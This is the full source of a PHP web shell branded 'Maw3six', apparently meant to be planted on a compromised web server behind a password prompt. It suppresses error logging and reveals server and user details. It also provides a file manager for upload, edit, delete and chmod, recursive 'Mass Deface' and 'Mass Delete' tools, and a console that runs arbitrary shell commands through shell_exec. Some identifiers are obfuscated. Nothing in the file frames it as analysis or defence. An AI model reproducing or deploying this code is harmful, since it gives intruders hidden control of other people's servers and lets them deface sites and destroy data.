<?php
session_start();

$hashed_password = '$2a$12$e78pTCtuKI3zcVIzapp9hu8O3gkaV1qFv2NIhbMWAtkmbP2Qcel.2';

function isAuthenticated() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Denied!";
    }
}

if (!isAuthenticated()) :
?>
<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
        form { display: inline-block; padding: 20px; border: 1px solid #ccc; background: #f9f9f9; }
    </style>
</head>
<body>
    <form method="POST">
        <h2>@Maw3six</h2>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">>></button>
    </form>
</body>
</html>
<?php
    exit;
endif;
?>

<?php
set_time_limit(0);
error_reporting(0); 
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta');

$_n = 'Maw3six';
$_s = "<style>table{display:none;}</style><div class='table-responsive'><hr></div>";
$_r = "required='required'";

if(isset($_GET['option']) && $_POST['opt'] == 'download'){
	header('Content-type: text/plain');
	header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
	echo(file_get_contents($_POST['path']));
	exit();
}

function ▟($path,$p) {
	if(isset($_GET['path'])) {
		$▚ = $_GET['path'];
	}else{
		$▚ = getcwd();
	}
	if(is_writable($▚)) {
		return "<span class='text-success'>".$p."</span>";
	}else{
		return "<span class='text-danger'>".$p."</span>";
	}
}

function ok(){
	echo '<div class="alert alert-success alert-dismissible fade show my-2" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}

function er(){
	echo '<div class="alert alert-danger alert-dismissible fade show my-2" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}

function sz($byt){
	$sz = array('B','KB','MB','GB','TB');
	for($i = 0; $byt >= 1024 && $i < (count($sz) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$sz[$i]);
}

function ip() {
	$ipas = '';
	if(getenv('HTTP_CLIENT_IP'))
		$ipas = getenv('HTTP_CLIENT_IP');
	else if(getenv('HTTP_X_FORWARDED_FOR'))
		$ipas = getenv('HTTP_X_FORWARDED_FOR');
	else if(getenv('HTTP_X_FORWARDED'))
		$ipas = getenv('HTTP_X_FORWARDED');
	else if(getenv('HTTP_FORWARDED_FOR'))
		$ipas = getenv('HTTP_FORWARDED_FOR');
	else if(getenv('HTTP_FORWARDED'))
		$ipas = getenv('HTTP_FORWARDED');
	else if(getenv('REMOTE_ADDR'))
		$ipas = getenv('REMOTE_ADDR');
	else
		$ipas = 'IP tidak dikenali';
	return $ipas;
}

function p($file){
	if($p = @fileperms($file)){
		$i = 'u';
		if(($p & 0xC000) == 0xC000)$i = 's';
		elseif(($p & 0xA000) == 0xA000)$i = 'l';
		elseif(($p & 0x8000) == 0x8000)$i = '-';
		elseif(($p & 0x6000) == 0x6000)$i = 'b';
		elseif(($p & 0x4000) == 0x4000)$i = 'd';
		elseif(($p & 0x2000) == 0x2000)$i = 'c';
		elseif(($p & 0x1000) == 0x1000)$i = 'p';
		$i .= ($p & 00400)? 'r':'-';
		$i .= ($p & 00200)? 'w':'-';
		$i .= ($p & 00100)? 'x':'-';
		$i .= ($p & 00040)? 'r':'-';
		$i .= ($p & 00020)? 'w':'-';
		$i .= ($p & 00010)? 'x':'-';
		$i .= ($p & 00004)? 'r':'-';
		$i .= ($p & 00002)? 'w':'-';
		$i .= ($p & 00001)? 'x':'-';
		return $i;
	} else {
		return "- ?? -";
	}
}

$disfunc = @ini_get("disable_functions");
if(empty($disfunc)) {
	$disfc = "<span class='text-success'>NONE</span>";
}else{
	$disfc = "<span class='text-danger'>$disfunc</span>";
}

if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
}else{
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<span class='text-danger'>ON</span>" : "<span class='text-success'>OFF</span>";
?>
<!DOCTYPE HTML>
<html>
<head>
	<meta name='author' content='<?php echo $_n; ?>'>
	<meta name='robots' content='noindex,nofollow'>
	<title><?php echo $_SERVER['HTTP_HOST']." - $_n"; ?></title>
	<meta name='viewport' content='width=device-width, initial-scale=1'>
	<link href='https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css' rel='stylesheet'>
	<link href='https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css' rel='stylesheet'>
	<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js'></script>
	<style>
		* { margin: 0; padding: 0; box-sizing: border-box; }
		
		body {
			background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
			color: #e8e8e8;
			font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
			font-size: 14px;
			line-height: 1.4;
			min-height: 100vh;
		}
		
		.main-container {
			max-width: 1200px;
			margin: 0 auto;
			padding: 10px;
		}
		
		.shell-card {
			background: rgba(23, 32, 49, 0.95);
			border: 1px solid rgba(100, 255, 218, 0.2);
			border-radius: 12px;
			box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
			backdrop-filter: blur(10px);
			margin-bottom: 15px;
			overflow: hidden;
		}
		
		.shell-header {
			background: linear-gradient(90deg, #64ffda 0%, #00bcd4 100%);
			color: #000;
			padding: 15px 20px;
			font-weight: 600;
			font-size: 18px;
		}
		
		.shell-body {
			padding: 20px;
		}
		
		.path-nav {
			background: rgba(0, 0, 0, 0.3);
			padding: 10px 15px;
			border-radius: 8px;
			margin-bottom: 15px;
			font-family: 'Courier New', monospace;
			font-size: 13px;
			border-left: 4px solid #64ffda;
		}
		
		.path-nav a {
			color: #64ffda;
			text-decoration: none;
			transition: all 0.3s ease;
		}
		
		.path-nav a:hover {
			color: #fff;
			background: rgba(100, 255, 218, 0.1);
			padding: 2px 5px;
			border-radius: 4px;
		}
		
		.info-collapse {
			background: rgba(0, 0, 0, 0.2);
			border: 1px solid rgba(100, 255, 218, 0.3);
			border-radius: 8px;
			padding: 15px;
			margin: 10px 0;
		}
		
		.info-collapse .text-success {
			color: #64ffda !important;
		}
		
		.btn-group .btn {
			background: rgba(100, 255, 218, 0.1);
			border: 1px solid rgba(100, 255, 218, 0.3);
			color: #64ffda;
			padding: 8px 16px;
			margin: 2px;
			border-radius: 6px;
			transition: all 0.3s ease;
			font-size: 13px;
		}
		
		.btn-group .btn:hover {
			background: rgba(100, 255, 218, 0.2);
			color: #fff;
			transform: translateY(-2px);
		}
		
		.file-table {
			background: rgba(0, 0, 0, 0.2);
			border-radius: 8px;
			overflow: hidden;
		}
		
		.file-table table {
			margin: 0;
			font-size: 13px;
		}
		
		.file-table th {
			background: rgba(100, 255, 218, 0.1);
			color: #64ffda;
			padding: 12px 8px;
			border: none;
			font-weight: 600;
		}
		
		.file-table td {
			padding: 8px;
			border-bottom: 1px solid rgba(100, 255, 218, 0.1);
			vertical-align: middle;
		}
		
		.file-table tr:hover {
			background: rgba(100, 255, 218, 0.05);
		}
		
		.file-table a {
			color: #e8e8e8;
			text-decoration: none;
		}
		
		.file-table a:hover {
			color: #64ffda;
		}
		
		.form-control, .form-select {
			background: rgba(0, 0, 0, 0.3);
			border: 1px solid rgba(100, 255, 218, 0.3);
			color: #e8e8e8;
			border-radius: 6px;
			padding: 8px 12px;
			margin-bottom: 10px;
		}
		
		.form-control:focus, .form-select:focus {
			background: rgba(0, 0, 0, 0.5);
			border-color: #64ffda;
			box-shadow: 0 0 0 0.2rem rgba(100, 255, 218, 0.25);
			color: #fff;
		}
		
		.btn-primary {
			background: linear-gradient(90deg, #64ffda 0%, #00bcd4 100%);
			border: none;
			color: #000;
			font-weight: 600;
			padding: 10px 20px;
			border-radius: 6px;
		}
		
		.btn-primary:hover {
			background: linear-gradient(90deg, #00bcd4 0%, #64ffda 100%);
			transform: translateY(-2px);
		}
		
		.alert {
			border: none;
			border-radius: 8px;
			margin: 10px 0;
		}
		
		.alert-success {
			background: rgba(100, 255, 218, 0.1);
			color: #64ffda;
			border-left: 4px solid #64ffda;
		}
		
		.alert-danger {
			background: rgba(255, 82, 82, 0.1);
			color: #ff5252;
			border-left: 4px solid #ff5252;
		}
		
		.footer {
			text-align: center;
			padding: 15px;
			color: rgba(232, 232, 232, 0.6);
			font-size: 12px;
		}
		
		.text-success { color: #64ffda !important; }
		.text-danger { color: #ff5252 !important; }
		.text-info { color: #00bcd4 !important; }
		
		/* Responsive */
		@media (max-width: 768px) {
			.main-container { padding: 5px; }
			.shell-body { padding: 15px; }
			.btn-group .btn { padding: 6px 12px; font-size: 12px; }
			.file-table { font-size: 12px; }
		}
	</style>
</head>
<body>
<div class='main-container'>
	<div class='shell-card'>
		<div class='shell-header'>
			<i class='bi bi-terminal'></i> <?php echo $_n; ?> Shell - <?php echo $_SERVER['HTTP_HOST']; ?>
		</div>
		<div class='shell-body'>
			<?php
			if(isset($_GET['path'])){
				$path = $_GET['path'];
			}else{
				$path = getcwd();
			}
			$path = str_replace('\\','/',$path);
			$paths = explode('/',$path);
			
			echo "<div class='path-nav'><i class='bi bi-hdd'></i> Path: ";
			foreach($paths as $id=>$pat){
				if($pat == '' && $id == 0){
					echo '<a href="?path=/">/</a>';
					continue;
				}
				if($pat == '') continue;
				echo '<a href="?path=';
				for($i=0;$i<=$id;$i++){
					echo "$paths[$i]";
					if($i != $id) echo "/";
				}
				echo '">'.$pat.'</a>/';
			}
			echo " <span class='text-info'>[ ".▟($path, p($path))." ]</span></div>";
			?>
		</div>
	</div>
	
	<div class='shell-card'>
		<div class='shell-body'>
			<div class='d-flex justify-content-between align-items-center mb-3'>
				<h6 class='mb-0'><i class='bi bi-info-circle'></i> Server Information</h6>
				<button class='btn btn-sm btn-outline-info' type='button' data-bs-toggle='collapse' data-bs-target='#serverInfo'>
					Toggle Info
				</button>
			</div>
			
			<div class='collapse' id='serverInfo'>
				<div class='info-collapse'>
					<div class='row g-3'>
						<div class='col-md-6'>
							<strong>System:</strong> <span class='text-success'><?php echo php_uname(); ?></span><br>
							<strong>Software:</strong> <span class='text-success'><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span><br>
							<strong>PHP Version:</strong> <span class='text-success'><?php echo PHP_VERSION; ?></span> 
							<a class='btn btn-sm btn-outline-info ms-2' href='?phpinfo&path=<?php echo $path; ?>'>PHP Info</a><br>
							<strong>PHP OS:</strong> <span class='text-success'><?php echo PHP_OS; ?></span>
						</div>
						<div class='col-md-6'>
							<strong>Server IP:</strong> <span class='text-success'><?php echo gethostbyname($_SERVER['HTTP_HOST']); ?></span><br>
							<strong>Your IP:</strong> <span class='text-success'><?php echo ip(); ?></span><br>
							<strong>User:</strong> <span class='text-success'><?php echo $user; ?></span> (<?php echo $uid; ?>) | <strong>Group:</strong> <span class='text-success'><?php echo $group; ?></span> (<?php echo $gid; ?>)<br>
							<strong>Safe Mode:</strong> <?php echo $sm; ?>
						</div>
						<div class='col-12'>
							<strong>Disabled Functions:</strong><br>
							<div class='mt-2' style='max-height: 100px; overflow-y: auto;'><?php echo $disfc; ?></div>
						</div>
					</div>
				</div>
			</div>
			
			<div class='text-center mt-3'>
				<div class='btn-group flex-wrap'>
					<a class='btn btn-outline-info' href='?upload&path=<?php echo $path; ?>'><i class='bi bi-upload'></i> Upload</a>
					<a class='btn btn-outline-warning' href='?mass_deface&path=<?php echo $path; ?>'><i class='bi bi-exclamation-triangle'></i> Mass Deface</a>
					<a class='btn btn-outline-danger' href='?mass_delete&path=<?php echo $path; ?>'><i class='bi bi-trash'></i> Mass Delete</a>
					<a class='btn btn-outline-success' href='?cmd&path=<?php echo $path; ?>'><i class='bi bi-terminal'></i> Console</a>
				</div>
			</div>
		</div>
	</div>
	
	<?php
	// Tools functionality
	if(isset($_GET['path'])) {
		$dir = $_GET['path'];
		chdir($dir);
	}else{
		$dir = getcwd();
	}
	$dir = str_replace("\\","/",$dir);

	// Mass deface functionality
	if(isset($_GET['mass_deface'])) {
		echo "<div class='shell-card'><div class='shell-body'>";
		
		function mass_kabeh($dir,$namafile,$isi_script) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$▚ = $dirc.'/'.$namafile;
					if($dirb === '.') {
						file_put_contents($▚, $isi_script);
					} elseif($dirb === '..') {
						file_put_contents($▚, $isi_script);
					}else{
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								echo "[<span class='text-success'><i class='bi bi-check'></i></span>] $▚<br>";
								file_put_contents($▚, $isi_script);
								mass_kabeh($dirc,$namafile,$isi_script);
							}
						}
					}
				}
			}
		}
		
		function mass_biasa($dir,$namafile,$isi_script) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$▚ = $dirc.'/'.$namafile;
					if($dirb === '.') {
						file_put_contents($▚, $isi_script);
					} elseif($dirb === '..') {
						file_put_contents($▚, $isi_script);
					}else{
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								echo "[<span class='text-success'><i class='bi bi-check'></i></span>] $dirb/$namafile<br>";
								file_put_contents($▚, $isi_script);
							}
						}
					}
				}
			}
		}
		
		if(isset($_POST['start'])) {
			if($_POST['tipe'] == 'massal') {
				mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			} elseif($_POST['tipe'] == 'biasa') {
				mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			}
		}
		
		echo "
		<h5><i class='bi bi-exclamation-triangle'></i> Mass Deface</h5>
		<form method='POST' class='mt-3'>
			<div class='mb-3'>
				<label class='form-label'>Type:</label>
				<div class='form-check'>
					<input class='form-check-input' type='radio' name='tipe' value='biasa' id='biasa' checked>
					<label class='form-check-label' for='biasa'>Normal (Current Directory Only)</label>
				</div>
				<div class='form-check'>
					<input class='form-check-input' type='radio' name='tipe' value='massal' id='massal'>
					<label class='form-check-label' for='massal'>Recursive (All Subdirectories)</label>
				</div>
			</div>
			
			<div class='mb-3'>
				<label class='form-label'><i class='bi bi-folder'></i> Directory:</label>
				<input class='form-control' type='text' name='d_dir' value='$dir'>
			</div>
			
			<div class='mb-3'>
				<label class='form-label'><i class='bi bi-file-earmark'></i> Filename:</label>
				<input class='form-control' type='text' name='d_file' placeholder='e.g., index.html' $_r>
			</div>
			
			<div class='mb-3'>
				<label class='form-label'><i class='bi bi-code'></i> File Content:</label>
				<textarea class='form-control' rows='8' name='script' placeholder='Enter your deface content here...' $_r></textarea>
			</div>
			
			<button class='btn btn-primary' type='submit' name='start'>
				<i class='bi bi-rocket'></i> Start Mass Deface
			</button>
		</form>
		</div></div>";
	}

	// Mass delete functionality
	if(isset($_GET['mass_delete'])) {
		echo "<div class='shell-card'><div class='shell-body'>";
		
		function hapus_massal($dir,$namafile) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$▚ = $dirc.'/'.$namafile;
					if($dirb === '.') {
						if(file_exists("$dir/$namafile")) {
							unlink("$dir/$namafile");
						}
					} elseif($dirb === '..') {
						if(file_exists("".dirname($dir)."/$namafile")) {
							unlink("".dirname($dir)."/$namafile");
						}
					}else{
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								if(file_exists($▚)) {
									echo "[<span class='text-success'><i class='bi bi-check'></i></span>] Deleted: $▚<br>";
									unlink($▚);
									hapus_massal($dirc,$namafile);
								}
							}
						}
					}
				}
			}
		}
		
		if(isset($_POST['start'])) {
			hapus_massal($_POST['d_dir'], $_POST['d_file']);
		}
		
		echo "
		<h5><i class='bi bi-trash'></i> Mass Delete</h5>
		<form method='POST' class='mt-3'>
			<div class='mb-3'>
				<label class='form-label'><i class='bi bi-folder'></i> Directory:</label>
				<input class='form-control' type='text' name='d_dir' value='$dir'>
			</div>
			
			<div class='mb-3'>
				<label class='form-label'><i class='bi bi-file-earmark'></i> Filename to Delete:</label>
				<input class='form-control' type='text' name='d_file' placeholder='e.g., index.html' $_r>
			</div>
			
			<button class='btn btn-danger' type='submit' name='start' onclick='return confirm(\"Are you sure you want to delete this file from all directories?\")'>
				<i class='bi bi-trash-fill'></i> Start Mass Delete
			</button>
		</form>
		</div></div>";
	}

	// Upload functionality
	if(isset($_GET['upload'])) {
		echo "<div class='shell-card'><div class='shell-body'>";
		
		if(isset($_POST['upload'])) {
			$root = $_POST['path'];
			if(isset($_FILES['berkaslu'])) {
				if(copy($_FILES['berkaslu']['tmp_name'], $root."/".$_FILES['berkaslu']['name'])) {
					ok();
					echo "Upload Success!";
					echo "</div>";
				} else {
					er();
					echo "Upload Failed!";
					echo "</div>";
				}
			}
		}
		
		echo "
		<h5><i class='bi bi-upload'></i> File Upload</h5>
		<form method='POST' enctype='multipart/form-data' class='mt-3'>
			<div class='mb-3'>
				<label class='form-label'><i class='bi bi-folder'></i> Upload Directory:</label>
				<input class='form-control' type='text' name='path' value='$dir'>
			</div>
			
			<div class='mb-3'>
				<label class='form-label'><i class='bi bi-file-earmark'></i> Select File:</label>
				<input class='form-control' type='file' name='berkaslu' $_r>
			</div>
			
			<button class='btn btn-primary' type='submit' name='upload'>
				<i class='bi bi-cloud-upload'></i> Upload File
			</button>
		</form>
		</div></div>";
	}

	// Command console functionality
	if(isset($_GET['cmd'])) {
		echo "<div class='shell-card'><div class='shell-body'>";
		
		if(isset($_POST['cmd'])) {
			echo "<div class='mb-3'><h6>Command Output:</h6>";
			echo "<div style='background: #000; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; white-space: pre-wrap; max-height: 400px; overflow-y: auto;'>";
			echo htmlspecialchars(shell_exec($_POST['perintah']));
			echo "</div></div>";
		}
		
		echo "
		<h5><i class='bi bi-terminal'></i> Command Console</h5>
		<form method='POST' class='mt-3'>
			<div class='mb-3'>
				<label class='form-label'><i class='bi bi-code'></i> Command:</label>
				<input class='form-control' type='text' name='perintah' placeholder='Enter your command here...' $_r>
			</div>
			
			<button class='btn btn-success' type='submit' name='cmd'>
				<i class='bi bi-play-fill'></i> Execute
			</button>
		</form>
		</div></div>";
	}

	// PHP Info
	if(isset($_GET['phpinfo'])) {
		phpinfo();
	}

	// File manager
	echo "<div class='shell-card'><div class='shell-body'>";
	echo "<h5><i class='bi bi-folder'></i> File Manager</h5>";

	if(isset($_POST['opt'])) {
		switch($_POST['opt']) {
			case 'hapus':
				if($_POST['type'] == 'dir') {
					rmdir($_POST['path']);
					ok(); echo "Directory deleted successfully!"; echo "</div>";
				} elseif($_POST['type'] == 'file') {
					unlink($_POST['path']);
					ok(); echo "File deleted successfully!"; echo "</div>";
				}
				break;
			case 'edit':
				if(isset($_POST['src'])) {
					$fp = fopen($_POST['name'], 'w');
					if(fwrite($fp, $_POST['src'])) {
						ok(); echo "File saved successfully!"; echo "</div>";
					} else {
						er(); echo "Failed to save file!"; echo "</div>";
					}
					fclose($fp);
				}
				echo "<h6>Edit File: ".$_POST['name']."</h6>";
				echo "<form method='POST'>";
				echo "<textarea class='form-control' rows='20' name='src'>".htmlspecialchars(file_get_contents($_POST['name']))."</textarea>";
				echo "<input type='hidden' name='name' value='".$_POST['name']."'>";
				echo "<input type='hidden' name='path' value='$path'>";
				echo "<button class='btn btn-primary mt-2' type='submit' name='opt' value='edit'><i class='bi bi-save'></i> Save File</button>";
				echo "</form>";
				break;
			case 'rename':
				if(isset($_POST['newname'])) {
					if(rename($_POST['oldname'], $_POST['path']."/".$_POST['newname'])) {
						ok(); echo "Renamed successfully!"; echo "</div>";
					} else {
						er(); echo "Rename failed!"; echo "</div>";
					}
				}
				echo "<h6>Rename: ".$_POST['name']."</h6>";
				echo "<form method='POST'>";
				echo "<input class='form-control mb-2' type='text' name='newname' value='".$_POST['name']."' $_r>";
				echo "<input type='hidden' name='path' value='".$_POST['path']."'>";
				echo "<input type='hidden' name='oldname' value='".$_POST['oldname']."'>";
				echo "<button class='btn btn-primary' type='submit' name='opt' value='rename'><i class='bi bi-pencil'></i> Rename</button>";
				echo "</form>";
				break;
			case 'chmod':
				if(isset($_POST['perm'])) {
					if(chmod($_POST['path'], octdec($_POST['perm']))) {
						ok(); echo "Permissions changed successfully!"; echo "</div>";
					} else {
						er(); echo "Failed to change permissions!"; echo "</div>";
					}
				}
				echo "<h6>Change Permissions: ".$_POST['name']."</h6>";
				echo "<form method='POST'>";
				echo "<input class='form-control mb-2' type='text' name='perm' value='".substr(sprintf('%o', fileperms($_POST['path'])), -4)."' $_r>";
				echo "<input type='hidden' name='path' value='".$_POST['path']."'>";
				echo "<input type='hidden' name='name' value='".$_POST['name']."'>";
				echo "<button class='btn btn-primary' type='submit' name='opt' value='chmod'><i class='bi bi-gear'></i> Change</button>";
				echo "</form>";
				break;
		}
	}

	echo "<div class='file-table'>";
	echo "<table class='table table-dark table-hover mb-0'>";
	echo "<thead><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr></thead>";
	echo "<tbody>";

	$scandir = scandir($path);
	foreach($scandir as $dir_item) {
		if(!is_dir($path."/".$dir_item) || $dir_item == '.' || $dir_item == '..') continue;
		echo "<tr>";
		echo "<td><i class='bi bi-folder-fill text-warning me-2'></i><a href='?path=$path/$dir_item'>$dir_item</a></td>";
		echo "<td>-</td>";
		echo "<td>".p($path."/".$dir_item)."</td>";
		echo "<td>".date("Y-m-d H:i", filemtime($path."/".$dir_item))."</td>";
		echo "<td>
			<form method='POST' class='d-inline'>
				<div class='btn-group btn-group-sm'>
					<button class='btn btn-outline-warning' name='opt' value='rename' title='Rename'><i class='bi bi-pencil'></i></button>
					<button class='btn btn-outline-info' name='opt' value='chmod' title='Permissions'><i class='bi bi-gear'></i></button>
					<button class='btn btn-outline-danger' name='opt' value='hapus' title='Delete' onclick='return confirm(\"Delete directory?\")' ><i class='bi bi-trash'></i></button>
				</div>
				<input type='hidden' name='type' value='dir'>
				<input type='hidden' name='name' value='$dir_item'>
				<input type='hidden' name='path' value='$path/$dir_item'>
				<input type='hidden' name='oldname' value='$path/$dir_item'>
			</form>
		</td>";
		echo "</tr>";
	}

	foreach($scandir as $file) {
		if(!is_file($path."/".$file)) continue;
		$size = filesize($path."/".$file);
		echo "<tr>";
		echo "<td><i class='bi bi-file-earmark text-info me-2'></i>$file</td>";
		echo "<td>".sz($size)."</td>";
		echo "<td>".p($path."/".$file)."</td>";
		echo "<td>".date("Y-m-d H:i", filemtime($path."/".$file))."</td>";
		echo "<td>
			<form method='POST' class='d-inline'>
				<div class='btn-group btn-group-sm'>
					<button class='btn btn-outline-primary' name='opt' value='edit' title='Edit'><i class='bi bi-pencil-square'></i></button>
					<button class='btn btn-outline-warning' name='opt' value='rename' title='Rename'><i class='bi bi-pencil'></i></button>
					<button class='btn btn-outline-info' name='opt' value='chmod' title='Permissions'><i class='bi bi-gear'></i></button>
					<button class='btn btn-outline-success' name='opt' value='download' title='Download'><i class='bi bi-download'></i></button>
					<button class='btn btn-outline-danger' name='opt' value='hapus' title='Delete' onclick='return confirm(\"Delete file?\")' ><i class='bi bi-trash'></i></button>
				</div>
				<input type='hidden' name='type' value='file'>
				<input type='hidden' name='name' value='$file'>
				<input type='hidden' name='path' value='$path/$file'>
				<input type='hidden' name='oldname' value='$path/$file'>
			</form>
		</td>";
		echo "</tr>";
	}
	?>
	</tbody>
	</table>
	</div>
	</div>
	</div>

	<div class='footer'>
		<div class='text-center'>
			&copy; <?php echo date('Y')." ".$_n; ?> | Shell bypass 403
		</div>
	</div>

</div>
</body>
</html>
